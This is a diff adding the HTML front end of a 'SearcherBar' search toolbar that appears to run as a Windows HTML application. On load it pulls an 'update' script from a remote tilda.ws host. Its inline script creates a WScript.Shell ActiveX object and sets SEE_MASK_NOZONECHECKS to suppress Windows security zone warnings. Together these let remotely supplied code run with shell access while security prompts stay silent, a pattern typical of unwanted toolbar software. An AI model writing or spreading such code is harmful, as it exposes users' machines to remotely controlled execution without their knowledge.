@@ -1,0 +1,74 @@
+<!--[if gt IE 6]>
+<!DOCTYPE html>
+<![endif]-->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" style="background-color: transparent">
+<head>
+  <title>SearcherBar</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <meta http-equiv="MSThemeCompatible" content="yes" />
+  <script type="text/javascript" src="https://searcherbar.tilda.ws/update/main"></script>
+
+  <!-- { FAVICON } -->
+  <link rel="shortcut icon" href="Icon.ico" type="image/x-icon" />
+
+  <!-- { IF [NOSCRIPT] } -->
+  <noscript>
+    <meta http-equiv="refresh" content="10;URL='https://searcherbar.tilda.ws/error/noscript/'">
+  </noscript>
+
+  <!-- { NO CACHE IE }-->
+  <meta http-equiv="cache-control" content="no-cache" />
+  <meta http-equiv="expires" content="0" />
+  <meta http-equiv="pragma" content="no-cache" />
+
+  <!-- { STYLES } -->
+  <link rel="stylesheet" type="text/css" href="css/index.css" />
+</head>
+<body>
+<div class="mask" id="mask"></div>
+<div class="search-bar">
+  <form class="search-bar__container" id="searchForm">
+    <label for="searchInput">
+      <img class="search-bar__logo" src="assets/logo.png" height="22px" alt="" id="logo">
+      <input id="searchInput" type="text" data-translate-placeholder="searchAnything" placeholder="Найдется все ...">
+    </label>
+
+    <button class="search-bar__button u1" type="submit" id="searchButton">
+      <img src="assets/search.png" alt="">
+    </button>
+
+    <button class="search-bar__button u2" id="settingsButton">
+      <img src="assets/settings.png" alt="">
+    </button>
+
+    <button class="search-bar__button u3" id="closeButton">
+      <img src="assets/close.png" alt="">
+    </button>
+  </form>
+  <ul class="search-bar__suggestions" id="suggestions">
+  </ul>
+</div>
+
+<script src="js/polyfills.js"></script>
+<script src="js/metrika.js"></script>
+<script src="js/statistics.js"></script>
+<script src="js/errorHandler.js"></script>
+<script src="js/localization.js"></script>
+<script src="js/main.js"></script>
+
+<script type="text/javascript">
+  try {
+    var WshShell = new ActiveXObject("WScript.Shell");
+    WshShell.CurrentDirectory = WshShell.CurrentDirectory + "\\";
+  } catch(e) { }
+
+  // fix NTFS zone checks alerts
+  try {
+    WshShell.Environment('PROCESS')('SEE_MASK_NOZONECHECKS') = 1;
+  } catch(e) { }
+
+  loadApp(pageInit)
+</script>
+</body>
+</html>
